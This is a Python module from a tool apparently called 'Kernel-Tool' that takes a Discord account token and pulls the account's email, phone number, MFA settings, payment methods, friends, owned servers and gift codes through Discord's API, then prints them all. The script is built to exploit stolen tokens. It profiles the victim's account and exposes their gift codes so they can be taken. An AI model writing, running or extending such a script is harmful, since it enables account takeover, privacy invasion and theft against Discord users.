# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

from Config.Util import *
from Config.Config import *

try:
    import requests
    import os
    from datetime import datetime, timezone
except Exception as e:
    ErrorModule(e)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

Title("Token Info")
clear()
print(token_info_banner)

try:
    discord_token = Choice1TokenDiscord()

    if not discord_token or discord_token.strip() == "":
        print(f"{LC}{BEFORE + AFTER} {ERROR} Token empty.{RS}")
        Continue()
        Reset()
    else:
        clear()
        print(token_info_banner)
        print(f"{LC}{BEFORE + AFTER} {WAIT} Retrieving Information..{RS}")

        token_status        = "Invalid"
        username            = "None"
        display_name        = "None"
        user_id             = "None"
        email               = "None"
        email_verified      = "None"
        phone               = "None"
        mfa_enabled         = "None"
        locale              = "None"
        avatar              = "None"
        avatar_decoration   = "None"
        public_flags        = "None"
        flags               = "None"
        banner              = "None"
        banner_color        = "None"
        accent_color        = "None"
        nsfw_allowed        = "None"
        account_created     = "None"
        nitro_status        = "None"
        avatar_url          = "None"
        linked_users        = "None"
        bio                 = "None"
        authenticator_types = "None"
        total_guilds        = "None"
        owned_guild_count   = "None"
        owned_guild_names   = "None"
        payment_methods     = "None"
        friends             = "None"
        gift_codes          = "None"

        try:
            headers = {'Authorization': discord_token, 'Content-Type': 'application/json'}
            token_response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            user_api = token_response.json()

            if token_response.status_code == 200:
                token_status = "Valid"
            else:
                token_status = "Invalid"

            username          = user_api.get('username', "None") + '#' + user_api.get('discriminator', "None")
            display_name      = user_api.get('global_name', "None")
            user_id           = user_api.get('id', "None")
            email             = user_api.get('email', "None")
            email_verified    = user_api.get('verified', "None")
            phone             = user_api.get('phone', "None")
            mfa_enabled       = user_api.get('mfa_enabled', "None")
            locale            = user_api.get('locale', "None")
            avatar            = user_api.get('avatar', "None")
            avatar_decoration = user_api.get('avatar_decoration_data', "None")
            public_flags      = user_api.get('public_flags', "None")
            flags             = user_api.get('flags', "None")
            banner            = user_api.get('banner', "None")
            banner_color      = user_api.get('banner_color', "None")
            accent_color      = user_api.get("accent_color", "None")
            nsfw_allowed      = user_api.get('nsfw_allowed', "None")
            bio               = user_api.get('bio', "None") or "None"

            try:
                account_created = datetime.fromtimestamp(
                    ((int(user_api.get('id', 0)) >> 22) + 1420070400000) / 1000, timezone.utc
                )
            except:
                account_created = "None"

            try:
                premium_type = user_api.get('premium_type', 0)
                nitro_map = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}
                nitro_status = nitro_map.get(premium_type, 'False')
            except:
                nitro_status = "None"

            try:
                av = user_api.get('avatar')
                if av:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{av}.gif"
                    if requests.get(avatar_url).status_code != 200:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{av}.png"
                else:
                    avatar_url = "None"
            except:
                avatar_url = "None"

            try:
                linked = user_api.get('linked_users', [])
                if linked:
                    linked_users = ' / '.join([f"{u.get('username','')}#{u.get('discriminator','')}" for u in linked])
            except:
                pass

            try:
                at = user_api.get('authenticator_types', [])
                if at:
                    authenticator_types = ' / '.join(map(str, at))
            except:
                pass

            try:
                guilds_resp = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
                if guilds_resp.status_code == 200:
                    guilds_data = guilds_resp.json()
                    total_guilds = len(guilds_data)
                    owned = [g for g in guilds_data if g.get('owner')]
                    owned_guild_count = f"({len(owned)})"
                    owned_guild_names = "\n" + "\n".join([f"{g['name']} ({g['id']})" for g in owned]) if owned else "None"
            except:
                pass

            try:
                billing_info = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
                if billing_info:
                    methods = []
                    for p in billing_info:
                        if p.get('type') == 1:
                            methods.append('CB')
                        elif p.get('type') == 2:
                            methods.append('Paypal')
                        else:
                            methods.append('Other')
                    payment_methods = ' / '.join(methods)
            except:
                pass

            try:
                friends_list = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers).json()
                if isinstance(friends_list, list) and friends_list:
                    f_list = []
                    for f in friends_list:
                        u = f.get('user', {})
                        f_list.append(f"{u.get('username','')}#{u.get('discriminator','')} ({u.get('id','')})")
                    friends = '\n' + ' / '.join(f_list[:20])
            except:
                pass

            try:
                gift_codes_list = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers).json()
                if isinstance(gift_codes_list, list) and gift_codes_list:
                    codes_list = []
                    for g in gift_codes_list:
                        promo = g.get('promotion', {}).get('outbound_title', '')
                        code  = g.get('code', '')
                        codes_list.append(f"Gift: {promo}\nCode: {code}")
                    gift_codes = '\n\n'.join(codes_list)
            except:
                pass

        except Exception as e:
            print(f"{LC}{BEFORE + AFTER} {ERROR} Error when retrieving information: {e}{RS}")

        Slow(f"""
{LC}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
{LC} {INFO_ADD} Status       : {LC}{token_status}
{LC} {INFO_ADD} Token        : {LC}{discord_token}
{LC} {INFO_ADD} Username     : {LC}{username}
{LC} {INFO_ADD} Display Name : {LC}{display_name}
{LC} {INFO_ADD} Id           : {LC}{user_id}
{LC} {INFO_ADD} Created      : {LC}{account_created}
{LC} {INFO_ADD} Country      : {LC}{locale}
{LC} {INFO_ADD} Email        : {LC}{email}
{LC} {INFO_ADD} Verified     : {LC}{email_verified}
{LC} {INFO_ADD} Phone        : {LC}{phone}
{LC} {INFO_ADD} Nitro        : {LC}{nitro_status}
{LC} {INFO_ADD} Linked Users : {LC}{linked_users}
{LC} {INFO_ADD} Avatar Decor : {LC}{avatar_decoration}
{LC} {INFO_ADD} Avatar       : {LC}{avatar}
{LC} {INFO_ADD} Avatar URL   : {LC}{avatar_url}
{LC} {INFO_ADD} Accent Color : {LC}{accent_color}
{LC} {INFO_ADD} Banner       : {LC}{banner}
{LC} {INFO_ADD} Banner Color : {LC}{banner_color}
{LC} {INFO_ADD} Flags        : {LC}{flags}
{LC} {INFO_ADD} Public Flags : {LC}{public_flags}
{LC} {INFO_ADD} NSFW         : {LC}{nsfw_allowed}
{LC} {INFO_ADD} MFA          : {LC}{mfa_enabled}
{LC} {INFO_ADD} Authenticator: {LC}{authenticator_types}
{LC} {INFO_ADD} Billing      : {LC}{payment_methods}
{LC} {INFO_ADD} Gift Codes   : {LC}{gift_codes}
{LC} {INFO_ADD} Guilds       : {LC}{total_guilds}
{LC} {INFO_ADD} Owner Guilds : {LC}{owned_guild_count}{owned_guild_names}
{LC} {INFO_ADD} Bio          : {LC}{bio}
{LC} {INFO_ADD} Friends      : {LC}{friends}
{LC}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{RS}
        """)
        Continue()
        Reset()

except Exception as e:
    Error(e)
